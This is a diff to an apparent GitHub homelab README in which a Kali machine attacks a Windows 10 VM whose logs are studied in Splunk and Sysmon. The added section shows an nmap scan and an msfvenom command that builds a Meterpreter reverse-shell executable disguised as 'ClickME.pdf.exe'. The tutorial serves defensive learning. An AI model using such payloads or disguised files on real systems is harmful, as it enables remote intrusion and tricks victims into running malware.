@@ -1,6 +1,6 @@
 # Overview
 This Homelab simulates an attacker and defender scenario which features a Kali Linux and a Windows 10 Enterprise virtual machine. 
-The Windows 10 machine utilizes Splunk to ingest logs to identify malicious traffic by the Kali machine, as well as Sysmon.
+The Windows 10 machine utilizes Splunk to ingest logs to identify malicious traffic by the Kali machine, as well as Sysmon. The goal of this lab is to gather and analyze network security logs and view them in Splunk.
 
 # Table of Contents
 - [Setting up VirtualBox](#Setting-up-VirtualBox)
@@ -201,7 +201,33 @@ This Lab utilizes Virtual Box as our hypervisor
   ```
 * This command conducts a scan of any potential open ports (Option -sV) of the Windows machine, and does not use any ICMP Pings (Option -Pn)
 * As a result, we noticed that port 3389 (Remote Desktop Protocol) was enabled
-<img width="691" height="112" alt="image" src="https://github.com/user-attachments/assets/3875f5cc-f0bf-4111-a515-86210f7419d1" />
+  <img width="691" height="112" alt="image" src="https://github.com/user-attachments/assets/3875f5cc-f0bf-4111-a515-86210f7419d1" />
+
+* We will now create a payload that involves the use of a reverse shell through a simulated malicious document
+* This will be accomplished using **msfvenom** and **metasploit** for payload creation and reverse shell capability. Additiionally, an http server will be created to have the transferability of the document
+* We will use the following command to identify which payload we will use for this scenario
+  ```
+  msfvenom -l payload
+  ```
+
+* We will use the following payload
+  ```
+  windows/x64/meterpreter_reverse_tcp  
+  ```
+
+* This payload connects the attacker's machine to the victim's machine, and creates a reverse shell, allowing the attack remote code capability
+* The following command string was used to create our payload
+  ```
+  msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.190.128 lport=443 -f exe -o       ClickME.pdf.exe
+  ```
+
+* This command creates our reverse shell using our kali machine as the local host, as well as using HTTPS (Port 443) as the local port. It also creates an executable file that contains two file extensions
+  *  Note: the default local port for a meterpreter shell is 4444, but I want to experiment with a different port
+*  We can verify the file was creating using **ls**
+  <img width="572" height="76" alt="image" src="https://github.com/user-attachments/assets/ae23d5e1-7cc2-4052-b053-ac6d633cb960" />
+
+       
+
 
 
 
